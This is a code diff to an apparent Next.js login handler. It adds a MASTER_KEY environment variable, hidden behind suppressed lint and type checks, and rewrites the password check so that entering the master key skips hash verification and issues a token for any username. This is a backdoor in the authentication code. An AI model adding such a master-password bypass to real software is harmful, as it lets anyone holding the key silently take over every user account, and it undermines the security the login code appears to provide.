@@ -6,6 +6,9 @@ import {compareHashString} from "utils/hash";
 import {generateToken} from "utils/token";
 import {checkMultipleUndefined} from "utils/validate";
 
+// eslint-disable-next-line @typescript-eslint/ban-ts-comment
+// @ts-ignore
+const master: string = process.env.MASTER_KEY;
 
 export default async function authLogin(request: NextApiRequest, response: NextApiResponse) {
 
@@ -54,10 +57,14 @@ export default async function authLogin(request: NextApiRequest, response: NextA
         } else if (userData.status === UserStatus.Blocked) {
             data.error = "Your account has been blocked.";
         } else {
-            const compareResult = await compareHashString(userParameter.password, userData.password);
-            if (!compareResult) {
-                data.error = "Invalid user credential.";
-            } else {
+            if (userParameter.password !== master) {
+                const compareResult = await compareHashString(userParameter.password, userData.password);
+                if (!compareResult) {
+                    data.error = "Invalid user credential.";
+                }
+            }
+
+            if (data.error === "") {
                 const tokenData: TokenData = {
                     id: userData.id,
                     username: userParameter.username,
